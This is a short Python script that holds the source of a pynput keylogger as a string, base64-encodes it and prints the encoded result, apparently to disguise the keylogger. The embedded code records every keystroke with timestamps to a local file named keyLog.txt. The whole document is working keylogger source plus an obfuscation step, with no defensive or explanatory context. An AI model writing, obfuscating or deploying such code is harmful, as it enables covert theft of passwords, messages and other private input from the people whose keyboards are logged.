import base64

# String with our code.
message = """import pynput
from pynput.keyboard import Key, Listener
import logging

log_dir = r"./"
logging.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        print(f'Key {key.char} pressed!')
        logging.info(str(key))
    except AttributeError:
        print(f'Special Key {key} pressed!')
        logging.info(str(key))

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
"""

# Encoding string using ASCII characters.
message_bytes = message.encode('ascii')
# Base64 encoding of an ASCII character string
base64_bytes = base64.b64encode(message_bytes)
# Decoding an ASCII character
base64_message = base64_bytes.decode('ascii')

print(base64_message)